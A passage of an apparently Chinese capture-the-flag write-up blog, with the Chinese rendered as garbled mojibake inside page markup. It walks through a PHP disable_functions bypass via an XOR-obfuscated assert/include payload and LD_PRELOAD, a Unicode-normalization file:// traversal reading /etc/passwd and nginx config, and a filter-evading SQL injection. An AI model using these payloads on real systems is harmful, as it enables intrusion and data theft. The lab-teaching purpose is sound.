¹ç›®å½•æœ‰flagï¼Œä½†æ˜¯ä¸ºç©ºï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶<br>è¿™é‡Œå¯ä»¥å‘ç°readflagè¿™ä¸ªæ–‡ä»¶ä½†æ˜¯å¹¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥å¾—ç»•è¿‡disable_function<br><a href="https://www.freebuf.com/articles/web/192052.html">å·§ç”¨LD_PRELOADçªç ´disable_functions</a><br>é€šè¿‡æ–‡ç« å¯ä»¥äº†è§£åˆ°<br>å¯¼è‡´ webshell ä¸èƒ½æ‰§è¡Œå‘½ä»¤çš„åŸå› å¤§æ¦‚æœ‰ä¸‰ç±»ï¼šä¸€æ˜¯ php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°ï¼›äºŒæ˜¯ web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­ï¼›ä¸‰æ˜¯ WAF æ‹¦åŠ«ã€‚è‹¥æ˜¯ä¸€åˆ™æ— æ³•æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œè‹¥æ˜¯äºŒã€ä¸‰åˆ™å¯ä»¥æ‰§è¡Œå°‘é‡å‘½ä»¤ã€‚</p><p>æœ‰å››ç§ç»•è¿‡ disable_functions çš„æ‰‹æ³•ï¼šç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´ï¼›ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼›ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼›ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚</p><p>ä¸‹è½½åšä¸»æ•´ç†çš„æºç <br>ä¸Šä¼ åˆ°èšå‰‘çš„var&#x2F;tmpç›®å½•ä¸‹<br><img src="/images/IDZ3WZLUP4E34ZIGIN.png"><br>æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°cmdä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°outpathä¸ºè¾“å…¥å‡ºæ–‡ä»¶ä½ç½®ï¼Œç¬¬ä¸‰ä¸ªsopathå‚æ•°ä¸ºä¸Šä¼ çš„soæ–‡ä»¶æ‰€åœ¨ä½ç½®<br>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">?code=$&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[_]($&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯å¼‚æˆ–ç»•è¿‡%##ä¸º16è¿›åˆ¶æ ¼å¼,å¼‚æˆ–è½¬åŒ–ä¸ºä¸‹<br>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>//å…¶ä¸­$&#123;_GET&#125;[_]ä¸$_GET[_]ç”¨æ³•ç±»ä¼¼ï¼Œä½†æœ¬é¢˜ç¬¬äºŒç§æ–¹æ³•è¯•äº†æ²¡é€šè¿‡ï¼Œå¯èƒ½æ˜¯å› ä¸ºç½‘ç»œé—®é¢˜ï¼Œæ²¡æœ‰æµ‹è¯•å¾ˆå¤šæ¬¡ï¼Œåå…­è¿›åˆ¶æ•°å¯¹åº”çš„å­—ç¬¦å°½é‡ä¸ºä¸å¯è§å­—ç¬¦ï¼Œä¸ç„¶ä¼šè¢«æµè§ˆå™¨ç¼–è¯‘ï¼Œå¯¼è‡´å¤±è´¥ã€‚ã€‚ã€‚<br></code></pre></td></tr></table></figure><p><img src="/images/FYRDD8A02HBUVNJJFWD.png"><br>è‡³æ­¤ä»¥å¤§åŠŸå‘Šæˆ</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/images/NUADL8I15TFAOGUYBJE0V.png"><br>å°†é¢˜ç›®ç»™çš„ä»£ç æ•´ç†ä¸€ä¸‹</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">getUrl</span>():<br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.<span class="hljs-built_in">urlparse</span>(url).hostname #è·å–åŸŸåip ä¾‹ï¼šwww.xxxx.com<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">urlsplit</span>(url)) <br>    host = parts[<span class="hljs-number">1</span>]<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.<span class="hljs-built_in">append</span>(h.<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-built_in">join</span>(newhost)<br>    #å»æ‰ url ä¸­çš„ç©ºæ ¼<br>    finalUrl = <span class="hljs-built_in">urlunsplit</span>(parts).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.<span class="hljs-built_in">urlparse</span>(finalUrl).hostname<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class="hljs-built_in">urlopen</span>(finalUrl).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-attribute">else</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜ç”¨çš„æ˜¯blackhatè®®é¢˜ä¹‹ä¸€HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization<br>nginxé…ç½®æ–‡ä»¶è·¯å¾„ black hatä¸€ä¸ªè®®é¢˜ ä»»æ„è¯»å–æ–‡ä»¶<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">åŸé“¾æ¥åœ¨è¿™</a><br>å…ˆæ¥åˆ†æä»£ç <br>å¯¹å‡ ä¸ªå‡½æ•°è¿›è¡Œè§£é‡Š<br>urlsplit(url)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span><br><br><span class="hljs-built_in">print</span>(urlsplit(url))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">SplitResult(</span><br><span class="hljs-string">    scheme=&#x27;https&#x27;, </span><br><span class="hljs-string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span><br><span class="hljs-string">    path=&#x27;/index.html;parameters&#x27;, </span><br><span class="hljs-string">    query=&#x27;name=tom&#x27;, </span><br><span class="hljs-string">    fragment=&#x27;example&#x27;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost<span class="hljs-selector-class">.append</span>(h<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>å¯¹å­—ç¬¦ä¸² host è¿›è¡Œäº†æ‹†åˆ†ï¼ˆsplitï¼‰æ“ä½œï¼Œç„¶åå¯¹æ¯ä¸ªåˆ†å‰²åçš„å­å­—ç¬¦ä¸²è¿›è¡Œäº†IDNAç¼–ç å’ŒUTF-8è§£ç ï¼Œæœ€ç»ˆå°†ç»“æœæ·»åŠ åˆ°åä¸º newhost çš„åˆ—è¡¨ä¸­ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(finalUrl)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº† urllib.request.urlopen å‡½æ•°æ¥æ‰“å¼€æŒ‡å®šçš„URLï¼ˆfinalUrlï¼‰ï¼Œå¹¶è°ƒç”¨ read() æ–¹æ³•è¯»å–è¯¥URLè¿”å›çš„æ•°æ®ã€‚</p><p>æ”¹ä¸€ä¸‹ä»£ç ï¼Œæ•´ä½“è¿è¡Œä¸€ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> urllib import parse<br><span class="hljs-keyword">from</span> urllib.parse import urlsplit, urlparse, urlunsplit<br><br><span class="hljs-comment">#@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><br>    # url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>url = <span class="hljs-string">&quot;http://suctf.cX&quot;</span><br>host = parse.urlparse(url).hostname #è·å–åŸŸåipä¾‹ï¼šwww.xxxx.com<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host1= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span>)<br>parts = list(urlsplit(url))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;parts = &#x27;</span>,parts)<br>host = parts[1]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host2= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222&quot;</span>)<br>newhost = []<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>    newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>parts[1] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br><span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span><br>finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[0]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finalUrl = &#x27;</span> + finalUrl)<br>host = parse.urlparse(finalUrl).hostname<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host3= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 444&quot;</span>)<br><br><br><span class="hljs-comment">#host1= suctf.cx</span><br><span class="hljs-comment">#parts =  [&#x27;http&#x27;, &#x27;suctf.cX&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="hljs-comment">#host2= suctf.cX</span><br><span class="hljs-comment">#finalUrl = http://suctf.cX</span><br><span class="hljs-comment">#host3= suctf.cx</span><br><span class="hljs-comment">#æˆ‘æ‰Œ your problem? 444</span><br></code></pre></td></tr></table></figure><p>ä»ä»£ç ä¸Šçœ‹ï¼Œæˆ‘ä»¬éœ€è¦æäº¤ä¸€ä¸ªurlï¼Œç”¨æ¥è¯»å–æœåŠ¡å™¨æ–‡ä»¶<br>éœ€è¦ç»•è¿‡å‰ä¸¤ä¸ªifï¼Œè¿›å…¥ç¬¬ä¸‰ä¸ªifæ¥ä½¿ç”¨å‡½æ•°<br>è€Œä¸‰ä¸ªifä¸­åˆ¤æ–­æ¡ä»¶éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰çš„hostæ„é€ å´æ˜¯ä¸åŒçš„ï¼Œè¿™ä¹Ÿæ˜¯blackhatè¯¥è®®é¢˜ä¸­æƒ³è¦è¯´æ˜çš„ä¸€ç‚¹<br>å½“URL ä¸­å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œè¾“å‡ºçš„ç»“æœå¯èƒ½ä¸åœ¨é¢„æœŸ<br>è¿™é‡Œéœ€è¦æŒ‰ç…§getUrlå‡½æ•°å†™å‡ºçˆ†ç ´è„šæœ¬å³å¯å¾—åˆ°æ„é€ è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url=url<br>    host=parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts=<span class="hljs-built_in">list</span>(urlsplit(url))<br>    host=parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost=[]<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl=urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host=parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_unicode()<br><br></code></pre></td></tr></table></figure><p><img src="/images/I1L8OCMS423Q6WG591.png"></p><p>æˆ‘ä»¬åªéœ€è¦è®©å…¶ä¸­çš„ä¸€ä¸ªå»è¯»å–æ–‡ä»¶å³å¯ï¼Œéœ€è¦urlç¼–ç ä¸€ä¸‹<br>å…ˆè¯»ä¸€ä¸‹etc&#x2F;passwd<br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/getUrl?url=file:/</span><span class="hljs-regexp">/suctf.c%E2%84%82/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/AZEKDNX7SKH3FWH78.png"><br>éƒ¨åˆ†nginxçš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">é…ç½®æ–‡ä»¶ï¼š <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="hljs-regexp">/etc/</span>nginx<br>ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>ç®¡ç†è„šæœ¬ï¼š<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>æ¨¡å—ï¼š<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>åº”ç”¨ç¨‹åºï¼š<span class="hljs-regexp">/usr/</span>sbin/nginx<br>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/var/</span>log/nginx<br></code></pre></td></tr></table></figure><p>æŒ¨ä¸ªè¯»è¯»è¯•è¯•<br>åœ¨é…ç½®æ–‡ä»¶ä¸­æˆ‘ä»¬å‘ç°<br><img src="/images/JEBYS4JSYT3P6T3.png"><br>è¯»å–<br><img src="/images/RENLJ0UVWDRW3HCA4.png"></p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>ç™»å½•é¡µé¢ï¼Œæœ‰æ³¨å†Œå…ˆæ³¨å†Œ<br>è¿™é‡Œadminè¢«æ³¨å†Œäº†ï¼Œæ³¨å†Œä¸€ä¸ªadmin1ï¼Œç™»å½•<br><img src="/images/EIMTIHG6GCW38WPEIR.png"><br>ç–‘ä¼¼æ³¨å…¥ç‚¹ï¼Œä¸‡èƒ½é’¥åŒ™æµ‹æµ‹<br><img src="/images/JVEITI0I8S3UWTV.png"><br>å­˜åœ¨è¿‡æ»¤ï¼Œå†æµ‹æµ‹<br>ä¸€ç•ªæµ‹è¯•ä»¥åï¼Œå‘ç°è¿‡æ»¤äº†or,#,â€“+å’Œç©ºæ ¼</p><ul><li><p>ç©ºæ ¼è¢«è¿‡æ»¤<br>å¯ä»¥ç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼</p></li><li><p>æ³¨é‡Šç¬¦è¢«è¿‡æ»¤<br>å°†åé¢çš„å•å¼•å·é—­åˆå³å¯</p></li><li><p>orè¢«è¿‡æ»¤<br>å¯¼è‡´ order by ã€information_schemaéƒ½ä¸èƒ½ç”¨ã€‚<br>äºæ˜¯æŸ¥è¡¨åå¯ä»¥ä½¿ç”¨select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database()</p></li></ul><p>å…ˆåˆ¤æ–­åˆ—æ•°<br>å› ä¸ºorè¢«ç¦ order byæ— æ³•ç”¨ï¼Œæ‰€ä»¥ç”¨group by ï¼Œä¸€æ ·çš„æ•ˆæœ<br>payload</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">23</span>,<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/images/80730O6C28XTPBO8R9.png"><br>åˆ¤æ–­ä¸º22åˆ—<br>å›æ˜¾ä½</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure><p>å›æ˜¾ä½ä¸º2ï¼Œ3</p><p>çˆ†æ•°æ®åº“</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/7P3H0XHID45SU1M592.png"></p><p>çˆ†è¡¨</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=<span class="hljs-string">&quot;web1&quot;</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/BOGXTMWDKOVT3N28.png"></p><p>å› ä¸ºå…³é”®å­—è¢«ç¦ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥çˆ†å­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿™ä¸€æ­¥éª¤ç›´æ¥é€šè¿‡è¡¨æ¥çˆ†å€¼<br>å­¦ä¹ åˆ°äº†ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼šä½¿ç”¨æ— 